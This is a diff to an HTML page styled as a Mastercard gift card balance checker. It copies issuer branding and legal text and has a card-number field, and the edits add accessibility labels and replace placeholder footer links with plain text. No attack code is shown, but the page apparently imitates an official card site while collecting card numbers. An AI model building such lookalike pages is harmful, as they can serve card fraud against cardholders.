@@ -547,7 +547,7 @@
       gap: 2rem;
       flex-wrap: wrap;
     }
-    .footer-links a {
+    .footer-links a, .footer-links span {
       color: rgba(255,255,255,0.7);
       text-decoration: none;
       font-size: 0.85rem;
@@ -644,8 +644,8 @@
   <!-- Header -->
   <header class="header">
     <div class="header-inner">
-      <a href="/" class="logo nav-link" data-page="home">
-        <div class="logo-circles">
+      <a href="/" class="logo nav-link" data-page="home" aria-label="Mastercard Gift Card Balance Checker - Home">
+        <div class="logo-circles" role="img" aria-label="Mastercard logo">
           <div class="logo-circle-red"></div>
           <div class="logo-circle-orange"></div>
         </div>
@@ -675,7 +675,7 @@
                     <label for="cardNumber">Card Number</label>
                     <div class="card-number-wrapper">
                       <input type="text" id="cardNumber" placeholder="Card Number" maxlength="23" inputmode="numeric" autocomplete="off">
-                      <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
+                      <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt="Card brand logo"></div>
                     </div>
                     <span class="field-error" id="cardError"></span>
                   </div>
@@ -780,7 +780,7 @@
   <!-- Footer -->
   <footer class="footer">
     <div class="footer-top">
-      <div class="footer-logo">
+      <div class="footer-logo" role="img" aria-label="Mastercard logo">
         <div class="logo-circle-red"></div>
         <div class="logo-circle-orange"></div>
       </div>
@@ -788,18 +788,18 @@
     </div>
 
     <div class="footer-legal">
-      <p>Mastercard&reg; Gift Cards are issued by Sutton Bank or Pathward, N.A. pursuant to license by Mastercard International Incorporated, and may be used in the U.S. and District of Columbia everywhere Debit Mastercard cards are accepted. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated. Sutton Bank and Pathward, N.A., Members FDIC. No cash or ATM access. Terms and conditions apply. See <a href="#">Cardholder Agreement</a> for details. Cards are distributed and serviced by InComm Financial Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772.</p>
-      <p>Colorado, Maryland, and Texas customers: <a href="#">View information</a> about addressing complaints regarding our money services business.</p>
+      <p>Mastercard&reg; Gift Cards are issued by Sutton Bank or Pathward, N.A. pursuant to license by Mastercard International Incorporated, and may be used in the U.S. and District of Columbia everywhere Debit Mastercard cards are accepted. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated. Sutton Bank and Pathward, N.A., Members FDIC. No cash or ATM access. Terms and conditions apply. See Cardholder Agreement for details. Cards are distributed and serviced by InComm Financial Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772.</p>
+      <p>Colorado, Maryland, and Texas customers: View information about addressing complaints regarding our money services business.</p>
       <p>Copyright &copy;2026 InComm Payments. All Rights Reserved.</p>
     </div>
 
     <div class="footer-bottom">
       <div class="footer-links">
-        <a href="#">Pathward, N.A. Privacy Policy</a>
-        <a href="#">Sutton Bank Privacy Policy</a>
-        <a href="#">Terms of Use</a>
-        <a href="#">Cardholder Agreement</a>
-        <a href="#">Accessibility Statement</a>
+        <span>Pathward, N.A. Privacy Policy</span>
+        <span>Sutton Bank Privacy Policy</span>
+        <span>Terms of Use</span>
+        <span>Cardholder Agreement</span>
+        <span>Accessibility Statement</span>
       </div>
     </div>
   </footer>
